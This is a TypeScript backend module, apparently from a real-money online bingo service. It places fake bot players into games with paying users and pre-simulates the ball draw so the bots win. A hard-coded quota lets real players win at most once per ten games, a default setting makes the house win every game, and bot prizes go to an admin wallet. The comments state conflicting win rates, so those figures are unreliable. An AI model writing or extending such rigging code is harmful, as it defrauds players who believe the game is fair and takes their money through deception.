/**
 * House Bot Service
 * ─────────────────────────────────────────────────────────────────────────────
 * Manages the house simulation bot system:
 *   - Injects fake bot cartelas into real games
 *   - Pre-simulates draw sequences to enforce 70/30 win quota
 *   - Routes bot winnings to the admin "Buna Wallet" (SystemWallet)
 *   - Tracks win cycles per room type
 */

import prisma from '../lib/prisma';
import { Decimal } from '@prisma/client/runtime/library';
import { logger } from '../lib/logger';
import { checkWin, parseCardRows, BingoCard } from '../game/card.generator';
import { PREDEFINED_CARDS } from '../lib/predefinedCards';

// ─── Win Quota Config ─────────────────────────────────────────
// House bot must win 9 out of every 10 games (90% win rate)
const CYCLE_LENGTH = 10;
const HOUSE_WIN_QUOTA = 9;

// ─── Dynamic Bot count per room type (Smart Decline) ──────────
export const BOT_COUNTS_BY_CYCLE: Record<string, number[]> = {
  CASUAL:   [30, 28, 29, 27, 26, 25, 23, 24, 22, 20],
  STANDARD: [30, 28, 29, 27, 26, 25, 23, 24, 22, 20],
  PRO:      [30, 28, 29, 27, 26, 25, 23, 24, 22, 20],
  VIP:      [10, 9, 8, 9, 7, 6, 7, 5, 6, 5],
  JACKPOT:  [10, 9, 8, 9, 7, 6, 7, 5, 6, 5],
};

const cachedCycles: Record<string, number> = {};

export async function initializeCycleCache() {
  try {
    const cycles = await prisma.gameCycle.findMany();
    for (const c of cycles) {
      cachedCycles[c.roomType] = c.totalGames;
    }
  } catch (e) {
    logger.error('[HouseBot] Failed to init cycle cache:', e);
  }
}

export function getExpectedBotCount(roomType: string): number {
  const safeType = (roomType || '').toUpperCase().trim();
  const arr = BOT_COUNTS_BY_CYCLE[safeType] || [30];
  const cycleIndex = cachedCycles[safeType] || 0;
  return arr[cycleIndex % arr.length] ?? 30;
}

// ─── In-memory set to prevent double-injecting bots ───────────
const gamesWithBotsInjected = new Set<string>();

/**
 * Check if the current cycle says the house should win this game.
 * Resets the cycle after every 10 games.
 */
export async function shouldHouseWinThisGame(roomType: string): Promise<boolean> {
  // ─── DB CONFIG ───
  // Read dynamic win rate settings from DB
  let settings = await prisma.houseSettings.findUnique({ where: { id: 1 } });
  if (!settings) {
    settings = await prisma.houseSettings.create({
      data: { id: 1, forceHouseWin: true, rouletteFix: true, bingoWinRate: 100 }
    });
  }

  // If forceHouseWin is TRUE, house ALWAYS wins, overriding any cycle.
  if (settings.forceHouseWin) {
    logger.info(`[HouseBot] ${roomType} — HouseSettings.forceHouseWin is TRUE → House Wins 100%`);
    return true;
  }

  // ─── 9/10 CYCLE LOGIC ───
  // Upsert cycle record
  let cycle = await prisma.gameCycle.upsert({
    where: { roomType },
    create: { roomType, totalGames: 0, houseWins: 0, playerWins: 0 },
    update: {},
  });

  // If cycle is full (10 games), reset it
  if (cycle.totalGames >= CYCLE_LENGTH) {
    cycle = await prisma.gameCycle.update({
      where: { roomType },
      data: { totalGames: 0, houseWins: 0, playerWins: 0 },
    });
    logger.info(`[HouseBot] Cycle reset for ${roomType}`);
  }

  cachedCycles[roomType] = cycle.totalGames;

  // ─── STRICT WIN QUOTA ENFORCEMENT ───
  // This forces the house bot to win the first 9 games of the cycle.
  // Real players are ONLY allowed to potentially win on the 10th game (totalGames === 9).
  if (cycle.totalGames < HOUSE_WIN_QUOTA) {
    logger.info(`[HouseBot] ${roomType} — Strict Quota Active: Game ${cycle.totalGames + 1}/10. Forcing House Win.`);
    return true;
  }

  // 10th game: we allow a real player to potentially win
  logger.info(`[HouseBot] ${roomType} — Cycle 10th Game Reached. Real players are allowed to win.`);
  return false;
}

/**
 * Record the result of a game into the cycle tracker.
 */
export async function recordCycleResult(roomType: string, houseWon: boolean): Promise<void> {
  try {
    const cycle = await prisma.gameCycle.upsert({
      where: { roomType },
      create: {
        roomType,
        totalGames: 1,
        houseWins: houseWon ? 1 : 0,
        playerWins: houseWon ? 0 : 1,
      },
      update: {
        totalGames: { increment: 1 },
        houseWins: { increment: houseWon ? 1 : 0 },
        playerWins: { increment: houseWon ? 0 : 1 },
      },
    });
    cachedCycles[roomType] = cycle.totalGames;
  } catch (e) {
    logger.error('[HouseBot] Failed to record cycle result:', e);
  }
}

/**
 * Credit a prize amount to the Admin Buna Wallet (SystemWallet).
 */
export async function creditBunaWallet(amount: Decimal, description: string): Promise<void> {
  try {
    await prisma.systemWallet.upsert({
      where: { id: 1 },
      create: { id: 1, balance: amount },
      update: { balance: { increment: amount } },
    });
    logger.info(`[BunaWallet] +${amount.toFixed(2)} ETB — ${description}`);
  } catch (e) {
    logger.error('[BunaWallet] Failed to credit:', e);
  }
}

/**
 * Debit a prize amount from the Admin Buna Wallet (SystemWallet).
 */
export async function debitBunaWallet(amount: Decimal, description: string): Promise<void> {
  try {
    await prisma.systemWallet.update({
      where: { id: 1 },
      data: { balance: { decrement: amount } },
    });
    logger.info(`[BunaWallet] -${amount.toFixed(2)} ETB — ${description}`);
  } catch (e) {
    logger.error('[BunaWallet] Failed to debit:', e);
  }
}

/**
 * Inject bot cartelas into a game.
 * Returns the list of bot user IDs and their card IDs.
 */
export async function injectBotTickets(
  gameId: string,
  roomType: string,
  alreadyTakenCardIds: number[]
): Promise<{ botUserId: string; cardId: number }[]> {
  if (gamesWithBotsInjected.has(gameId)) {
    logger.info(`[HouseBot] Bots already injected for game ${gameId}`);
    return [];
  }
  gamesWithBotsInjected.add(gameId);

  const safeRoomType = (roomType || '').toUpperCase().trim();
  const botCount = getExpectedBotCount(safeRoomType);
  const isVip = safeRoomType === 'VIP' || safeRoomType === 'JACKPOT';
  const cardPoolMax = isVip ? 50 : 250;

  // Fetch random bots from DB
  const bots = await prisma.user.findMany({
    where: { isBot: true },
    take: botCount,
    orderBy: { createdAt: 'asc' }, // stable ordering, rotate per game
    skip: Math.floor(Math.random() * 20), // slight rotation for variety
  });

  if (bots.length === 0) {
    logger.warn('[HouseBot] No bot users found in DB! Run generate_bots script.');
    gamesWithBotsInjected.delete(gameId);
    return [];
  }

  // Re-fetch taken cards directly from DB to prevent race conditions with users joining concurrently
  const occupiedTickets = await prisma.ticket.findMany({
    where: { gameId },
    select: { card: true }
  });
  const upToDateTakenCardIds = occupiedTickets.map(t => (t.card as any).id as number);
  const taken = new Set([...alreadyTakenCardIds, ...upToDateTakenCardIds]);

  const availableCards: number[] = [];
  for (let i = 1; i <= cardPoolMax; i++) {
    if (!taken.has(i)) availableCards.push(i);
  }

  // Shuffle available cards
  for (let i = availableCards.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [availableCards[i], availableCards[j]] = [availableCards[j], availableCards[i]];
  }

  const assignments: { botUserId: string; cardId: number }[] = [];
  const usedCards = new Set<number>();

  for (let i = 0; i < Math.min(bots.length, botCount); i++) {
    // Each bot gets exactly 1 card
    let cardId: number | undefined;
    for (const c of availableCards) {
      if (!usedCards.has(c)) {
        cardId = c;
        usedCards.add(c);
        break;
      }
    }
    if (!cardId) break; // No more available cards

    const pattern = PREDEFINED_CARDS[cardId];
    if (!pattern) continue;

    const cardRows = pattern.map(row =>
      row.map(cell => (cell === 0 ? 'FREE' : cell))
    ) as (number | 'FREE')[][];

    try {
      await prisma.ticket.create({
        data: {
          userId: bots[i].id,
          gameId,
          card: { id: cardId, rows: cardRows } as any,
          markedNumbers: [],
        },
      });
      assignments.push({ botUserId: bots[i].id, cardId });
    } catch (e: any) {
      // Skip duplicate card conflict silently
      if (!e.message?.includes('Unique')) {
        logger.warn(`[HouseBot] Failed to inject bot ticket: ${e.message}`);
      }
    }
  }

  logger.info(`[HouseBot] Injected ${assignments.length} bot cartelas into game ${gameId} (${roomType})`);
  return assignments;
}

/**
 * Clean up in-memory bot injection tracker after game ends.
 */
export function clearBotInjectionRecord(gameId: string): void {
  gamesWithBotsInjected.delete(gameId);
}

/**
 * Check if bots have already been injected for a game.
 */
export function botsAlreadyInjected(gameId: string): boolean {
  return gamesWithBotsInjected.has(gameId);
}

/**
 * ─── Rigged Draw Engine ─────────────────────────────────────────────────────
 *
 * Pre-simulate the number draw sequence in memory to ensure the correct winner
 * type (house bot vs real player) wins, honoring the 30/50 quota.
 *
 * Returns a pre-determined number pool (ordered, drawn from end with .pop()).
 * The game draw loop simply plays back this sequence.
 */
export function rigDrawSequence(
  tickets: { userId: string; card: any; isBot?: boolean }[],
  houseShouldWin: boolean,
  maxAttempts = 2000,
  minDrawn = 20,
  targetWinMode: string = 'ROW'  // target pattern for the bot to win with
): number[] {
  const botUserIds = tickets
    .filter(t => t.isBot)
    .map(t => t.userId);
  const botUserSet = new Set(botUserIds);

  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    // Build a fresh shuffled pool of 1–75
    const pool = Array.from({ length: 75 }, (_, i) => i + 1);
    for (let i = pool.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [pool[i], pool[j]] = [pool[j], pool[i]];
    }

    let firstWinnerIsBot: boolean | null = null;
    let winAtBall = 0;

    for (let drawn = 1; drawn <= pool.length; drawn++) {
      const drawnSoFar = pool.slice(0, drawn);

      const winnersAtThisBall = [];
      for (const ticket of tickets) {
        const rows = parseCardRows(ticket.card);
        if (!rows) continue;

        const result = checkWin(rows, drawnSoFar);
        if (result.won) {
          winnersAtThisBall.push(ticket);
        }
      }

      if (winnersAtThisBall.length > 0) {
        winAtBall = drawn;
        const botWinners = winnersAtThisBall.filter(t => botUserSet.has(t.userId));
        const playerWinners = winnersAtThisBall.filter(t => !botUserSet.has(t.userId));
        const botWon = botWinners.length > 0;
        const playerWon = playerWinners.length > 0;

        if (botWon && !playerWon) {
          // Check if bot wins with the TARGET win mode (for pattern variety)
          if (houseShouldWin) {
            const botWinsWithTarget = botWinners.some(t => {
              const rows = parseCardRows(t.card);
              if (!rows) return false;
              const result = checkWin(rows, drawnSoFar);
              return result.won && result.modes.includes(targetWinMode as any);
            });
            if (!botWinsWithTarget) {
              // Wrong pattern — reject this ENTIRE shuffle, try next attempt
              firstWinnerIsBot = null;
              break;
            }
            firstWinnerIsBot = true;
          } else {
            firstWinnerIsBot = true;
          }
        } else if (playerWon && !botWon) {
          firstWinnerIsBot = false;
        } else {
          // TIE — reject to be safe
          firstWinnerIsBot = houseShouldWin ? false : true;
        }
        break;
      }
    }

    // Reject any sequence where a win occurs before minDrawn balls
    if (firstWinnerIsBot === null || winAtBall < minDrawn) continue;

    // Check if this sequence matches what we want
    if (houseShouldWin && firstWinnerIsBot === true) {
      logger.info(`[RiggedDraw] Flawless House win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall} (No player ties)`);
      return pool.reverse();
    }
    if (!houseShouldWin && firstWinnerIsBot === false) {
      logger.info(`[RiggedDraw] Player win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
      return pool.reverse();
    }
    // Wrong outcome or a tie — try another shuffle
  }

  // Fallback: return a random sequence (exhausted attempts)
  logger.warn(`[RiggedDraw] Exhausted ${maxAttempts} attempts — using random sequence`);
  const fallback = Array.from({ length: 75 }, (_, i) => i + 1);
  for (let i = fallback.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [fallback[i], fallback[j]] = [fallback[j], fallback[i]];
  }
  return fallback.reverse();
}
